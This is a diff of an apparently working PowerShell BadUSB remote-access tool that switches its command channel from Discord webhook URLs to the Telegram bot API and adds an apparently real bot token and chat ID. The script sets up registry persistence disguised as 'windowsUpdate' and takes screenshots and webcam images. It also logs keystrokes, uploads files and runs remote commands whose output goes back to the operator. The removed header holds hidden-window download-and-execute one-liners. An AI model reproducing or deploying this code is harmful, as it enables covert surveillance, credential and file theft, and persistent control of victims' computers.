@@ -1,26 +1,9 @@
-
-<#  
-BADUSB COMMANDS:
-    # Execute 
-    powershell.exe -windowstyle hidden -file this_file.ps1
-    #Execute script from github
-    iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-    PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-    PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
-REGEDIT:
-	reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file C:\Temp\windowsUpdate.ps1"	
-    https://www.akadia.com/services/windows_registry.html 
-BOT TELEGRAM:
-    https://stackoverflow.com/questions/34457568/how-to-show-options-in-telegram-bot
-	#>
-
-
 ############
 ## CONFIG ##
 ############
 
-$BotToken = "885590558444253264"
-$ChatID = 'yZOYmyI2PoERmgyla-Xlqux3CppTg9_Asf6S7yCxl9B5zuwld4B4n5v0lwm2U8uSWxi6'
+$BotToken = "1833256998:AAECTG9i5e2ehhN7W5hXvFt6_rB3EIa1pPA"
+$ChatID = '1913579690'
 $githubScript = 'https://github.com/Cyclonicrazor/Placeholder/blob/main/poc.ps1'
 
 
@@ -82,7 +65,7 @@ function backdoor {
         # Check backdoor
         #$checkBackdoor = Get-CimInstance Win32_StartupCommand | Select-String windowsUpdate
         $checkBackdoor = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String windowsUpdate
-        Invoke-RestMethod -Uri "https://discord.com/api/webhooks/$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
+        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkBackdoor)"
 		
         # Backdoor on startup programs
         $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Temp\windowsUpdate.ps1"
@@ -147,7 +130,7 @@ function installCurl {
 
 function sendPhoto {
     Send-Message "Sending.."
-    $uri = "https://discord.com/api/webhooks/" + $BotToken + "/sendPhoto"
+    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\screenshot.jpg"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
@@ -160,7 +143,7 @@ function sendPhoto {
 }
 
 function Send-Message($message) {
-    $uri = "https://discord.com/api/webhooks/" + $BotToken + "/sendMessage"
+    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F text=' + $message  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
@@ -169,16 +152,16 @@ function Send-Message($message) {
 function ipPublic {
     #$ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select -exp ip
     $ipPublic = Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip
-    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
+    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ipPublic)&parse_mode=html"
 }
 
 function download($FileToDownload) {
-    $uri = "https://discord.com/api/webhooks/" + $BotToken + "/sendDocument"
+    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendDocument"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -k '
     Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
 
-    #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://discord.com/api/webhooks/<token>/sendDocument
+    #curl -F chat_id="$ChatID" -F document=@"$FileToDownload" https://api.telegram.org/bot<token>/sendDocument
 }
 
 function keylogger($seconds) {
@@ -275,7 +258,7 @@ function webcam {
     Start-Sleep -Seconds 5
 
     Send-Message "Sending_picture.."
-    $uri = "https://discord.com/api/webhooks/" + $BotToken + "/sendPhoto"
+    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendPhoto"
     $photo = "C:\Users\$env:username\Documents\image.jpg"
     $curl = installCurl
     $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F photo=@' + $photo  + ' -k '
@@ -602,7 +585,7 @@ $payload = @{
     "disable_web_page_preview" = $preview_mode;
 }
 Invoke-WebRequest `
-    -Uri ("https://discord.com/api/webhooks/{0}/sendMessage" -f $BotToken) `
+    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
     -Method Post `
     -ContentType "application/json;charset=utf-8" `
     -Body (ConvertTo-Json -Compress -InputObject $payload)
@@ -617,7 +600,7 @@ $LoopSleep = 3
  
  
 #Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
-$BotUpdates = Invoke-WebRequest -Uri "https://discord.com/api/webhooks/$($BotToken)/getUpdates"
+$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
 $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
 $LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
  
@@ -637,7 +620,7 @@ While ($DoNotExit)  {
   $Message = ""
   
   #Get the current Bot Updates and store them in an array format to make it easier
-  $BotUpdates = Invoke-WebRequest -Uri "https://discord.com/api/webhooks/$($BotToken)/getUpdates"
+  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates"
   $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
   
   #Get just the last message:
@@ -674,22 +657,22 @@ While ($DoNotExit)  {
 		}
 		
 		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result"
-		$SendMessage = Invoke-RestMethod -Uri "https://discord.com/api/webhooks/$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
         $pwd = pwd
         $info = '[!] ' + $hostname + ' - ' + $whoami + ' - ' + $ipv4 + ' ' + $pwd + '> '
-		Invoke-RestMethod -Uri "https://discord.com/api/webhooks/$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
+		Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($info)"
 	  }
 	  "/stop $ipV4"  {
 		#The user wants to stop the script
 		write-host "The script will end in 5 seconds"
 		$ExitMessage = "$($LastMessage.Message.from.first_name) has requested the script to be terminated. It will need to be started again in order to accept new messages!"
-		$ExitRestResponse = Invoke-RestMethod -Uri "https://discord.com/api/webhooks/$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
+		$ExitRestResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($ExitMessage)&parse_mode=html"
 		Sleep -seconds 5
 		$DoNotExit = 0
 	  }
       "/list"  {
         Invoke-WebRequest `
-        -Uri ("https://discord.com/api/webhooks/{0}/sendMessage" -f $BotToken) `
+        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
         -Method Post `
         -ContentType "application/json;charset=utf-8" `
         -Body (ConvertTo-Json -Compress -InputObject $payload)
@@ -744,7 +727,7 @@ While ($DoNotExit)  {
 	  default  {
 	    #The message sent is unknown
 		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
-		$SendMessage = Invoke-RestMethod -Uri "https://discord.com/api/webhooks/$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
+		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html"
 	  }
 	}
 	
